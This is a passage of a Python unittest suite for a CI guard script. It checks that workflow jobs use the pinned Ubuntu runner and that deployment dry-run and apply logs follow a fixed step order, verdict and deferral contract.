        self.assertIn("会先执行的命令", "\n".join(problems))

    def test_every_job_runs_on_the_runner_the_platform_conditions_assume(self) -> None:
        workflow = WORKFLOW.read_text(encoding="utf-8")
        self.assertEqual(GUARD.check_platform_runner(workflow), [])
        runners = {
            line.split(":", 1)[1].strip()
            for line in workflow.splitlines()
            if line.startswith("    runs-on:")
        }
        self.assertEqual(runners, {GUARD.CI_RUNNER_IMAGE})

    def test_the_platform_strings_follow_the_pinned_runner_image(self) -> None:
        self.assertEqual(GUARD.CI_RUNNER_IMAGE.rsplit("-", 1)[0], "ubuntu")
        self.assertEqual(GUARD.CI_PLATFORM, "linux")
        self.assertEqual(
            GUARD.CI_PLATFORM_STRINGS,
            {"sys.platform": "linux", "platform.system()": "Linux", "os.name": "posix"},
        )

    def test_a_job_on_another_runner_is_red(self) -> None:
        problems = self._workflow_problems(("    runs-on: ubuntu-24.04", "    runs-on: macos-14"))
        self.assertTrue(problems)
        message = "\n".join(problems)
        self.assertIn("macos-14", message)
        self.assertIn(GUARD.CI_RUNNER_IMAGE, message)

    def test_every_runs_on_spelling_gets_the_same_verdict(self) -> None:
        # `runs-on: macos-14`, `runs-on: [macos-14]` and `runs-on:` + `- macos-14` all
        # name the same image, so all three have to agree; reading only the scalar
        # form left a job on another runner out of `runners` entirely, which is the
        # opposite verdict from the equivalent inline sequence. An empty value names
        # no image at all, so `runs-on: []` and the empty block sequence agree too.
        for replacement, red in (
            ("    runs-on: macos-14", True),
            ("    runs-on: [macos-14]", True),
            ("    runs-on:\n      - macos-14", True),
            ("    runs-on: [ubuntu-24.04, macos-14]", True),
            ("    runs-on: [ubuntu-24.04]", False),
            ("    runs-on:\n      - ubuntu-24.04", False),
        ):
            with self.subTest(replacement=replacement):
                problems = self._workflow_problems(("    runs-on: ubuntu-24.04", replacement))
                self.assertEqual(bool(problems), red, "\n".join(problems))
        self.assertIn(
            "macos-14",
            "\n".join(
                self._workflow_problems(
                    ("    runs-on: ubuntu-24.04", "    runs-on:\n      - macos-14")
                )
            ),
        )

    def test_an_empty_inline_runner_sequence_is_red(self) -> None:
        # `runs-on: []` names no image, so it must be red like the empty block form
        # instead of dropping that job out of the checked set. Only one job is
        # rewritten: rewriting all of them would leave no `runs-on` to read at all,
        # which is a different (already covered) failure.
        problems = self._workflow_problems(
            ("    runs-on: ubuntu-24.04", "    runs-on: []"), count=1
        )
        self.assertTrue(problems)
        self.assertIn("runs-on", "\n".join(problems))

    def test_a_missing_guard_subcommand_is_red(self) -> None:
        text = WORKFLOW.read_text(encoding="utf-8")
        stripped = text.replace(
            "      - name: Probe the registered pure judgement functions\n"
            "        # `--dry-run` returns from every state-changing step before judging, so an\n"
            "        # apply-path judgement that was emptied (migration_verify returning None\n"
            "        # forever) would stay green. `probe` imports the entry and calls the\n"
            "        # functions registered in PROBE_CASES with inputs that must fail; deleting a\n"
            "        # case, or the implementation behind it, is red because the registry and its\n"
            "        # documentation anchor are compared on every run.\n"
            "        run: |\n"
            "          python3 scripts/dev-env/ci-entry-guard.py probe\n",
            "",
        )
        self.assertNotEqual(text, stripped)
        with tempfile.TemporaryDirectory() as directory:
            copied = Path(directory) / "ci.yml"
            copied.write_text(stripped, encoding="utf-8")
            problems, _summary = GUARD.run_wiring(copied)
        self.assertTrue(problems)
        self.assertIn("probe", "\n".join(problems))


DRY_RUN_LOG = textwrap.dedent(
    """\
    steps=7 order=tools, migrate, roles, buckets, stack, gate, health mode=dry-run gate=compose
    [1/7] tools — 工具与版本
          结论: PLAN — 版本已确认
    [2/7] migrate — 迁移
          结论: PLAN — 待执行
    [3/7] roles — 角色
          结论: PLAN — 待执行
    [4/7] buckets — 桶
          结论: PLAN — 待执行
    [5/7] stack — 栈
          结论: PLAN — 待执行
    [6/7] gate — 闸门
          待输入: gateway 未 healthy；需要它先运行
          结论: PLAN — 待输入
    [7/7] health — 健康
          结论: PLAN — 待执行
    步骤记录: tools=PLAN migrate=PLAN roles=PLAN buckets=PLAN stack=PLAN gate=PLAN health=PLAN
    reference acceptance: DRY-RUN PASS steps=7 pending=1
    """
)

GATEWAY_DEFERRAL = "gateway 未 healthy；需要它先运行"
REWORDED_DEFERRAL = "gateway 尚未 healthy（需先启动）；复用其网络"
NEW_LANE_DEFERRAL = "缺少 gateway lane 配置: /run/speechnexus-private/gateway-file-voice.json"

APPLY_LOG = textwrap.dedent(
    """\
    steps=7 order=tools, migrate, roles, buckets, stack, gate, health mode=apply gate=direct
    [1/7] tools — 工具与版本
          结论: PASS — 版本已确认
    [2/7] migrate — 迁移
          结论: PASS — 已在 head
    [3/7] roles — 角色
          结论: PASS — 已安装
    [4/7] buckets — 桶
          结论: PASS — 已确认
    [5/7] stack — 栈
          结论: PASS — 已启动
    [6/7] gate — 闸门
          结论: PASS — 通过
    [7/7] health — 健康
          结论: PASS — 四个探针通过
    步骤记录: tools=PASS migrate=PASS roles=PASS buckets=PASS stack=PASS gate=PASS health=PASS
    reference acceptance: PASS steps=7
    """
)


class LogContractTests(unittest.TestCase):
    def check(self, text: str, *, mode: str = "dry-run") -> tuple[list[str], str]:
        with tempfile.TemporaryDirectory() as directory:
            log = Path(directory) / "run.log"
            log.write_text(text, encoding="utf-8")
            problems, summary = GUARD.check_log(log, GUARD.EXPECTED_STEP_ORDER, expect_mode=mode)
        return [str(problem) for problem in problems], str(summary)

    def test_the_contract_passes(self) -> None:
        problems, summary = self.check(DRY_RUN_LOG)
        self.assertEqual(problems, [], summary)
        self.assertIn("1 deferrals", summary)

    def test_an_apply_mode_log_is_parseable(self) -> None:
        problems, _summary = self.check(APPLY_LOG, mode="apply")
        self.assertEqual(problems, [])

    def test_a_reworded_deferral_stays_green(self) -> None:
        problems, _summary = self.check(DRY_RUN_LOG.replace(GATEWAY_DEFERRAL, REWORDED_DEFERRAL))
        self.assertEqual(problems, [])

    def test_a_new_deferral_is_red_with_the_registration_line(self) -> None:
        problems, _summary = self.check(
            DRY_RUN_LOG.replace(GATEWAY_DEFERRAL, NEW_LANE_DEFERRAL).replace(
                "pending=1", "pending=1"
            )
        )
        self.assertTrue(problems)
        message = "\n".join(problems)
        self.assertIn("未登记的延后项", message)
        self.assertIn("DECLARED_DEFERRALS", message)

    def test_a_deferral_that_mentions_another_condition_is_red(self) -> None:
        problems, _summary = self.check(
            DRY_RUN_LOG.replace(GATEWAY_DEFERRAL, "gateway 不 healthy：镜像未构建、模型未下载")
        )
        self.assertTrue(problems, "换了原因却包含 gateway/healthy 的延后项必须红")
        self.assertIn("未登记的延后项", "\n".join(problems))

    def test_step_ids_may_contain_digits(self) -> None:
        problems, _summary = self.check(
            DRY_RUN_LOG.replace("buckets,", "db2,")
            .replace("[4/7] buckets", "[4/7] db2")
            .replace("buckets=PLAN", "db2=PLAN")
        )
        # The order no longer matches the contract (that is expected), but the header
        # must still be *parsed* rather than reported as missing.
        self.assertNotIn("缺少机器可读首行", "\n".join(problems))

    def test_order_drift_is_red(self) -> None:
        problems, _summary = self.check(
            DRY_RUN_LOG.replace("buckets, stack, gate", "buckets, gate, stack")
        )
        self.assertTrue(problems)
        self.assertIn("order=", "\n".join(problems))

    def test_a_pending_mismatch_is_red(self) -> None:
        problems, _summary = self.check(DRY_RUN_LOG.replace("pending=1", "pending=0"))
        self.assertTrue(problems)
        self.assertIn("pending", "\n".join(problems))

    def test_a_dry_run_claiming_pass_is_red(self) -> None:
        problems, _summary = self.check(
            DRY_RUN_LOG.replace("结论: PLAN — 待执行", "结论: PASS — 待执行", 1)
        )
        self.assertTrue(problems)
        self.assertIn("PLAN", "\n".join(problems))

    def test_a_missing_log_is_an_error_not_a_pass(self) -> None:
        with self.assertRaises(FileNotFoundError):
            GUARD.check_log(Path("/nonexistent/log.txt"), GUARD.EXPECTED_STEP_ORDER)


class EntrypointTests(unittest.TestCase):
    def test_the_dry_run_contract_and_guards_agree_on_the_step_order(self) -> None:
        module = GUARD._load_entry(ENTRY)
        self.assertEqual([step.ident for step in module.STEPS], list(GUARD.EXPECTED_STEP_ORDER))

    def test_the_documented_contract_mentions_every_guard(self) -> None:
        text = DOC.read_text(encoding="utf-8")
        for name in ("sites", "probe", "wiring", "log"):
            with self.subTest(guard=name):
                self.assertIn(f"`{name}`", text)


if __name__ == "__main__":
    unittest.main()
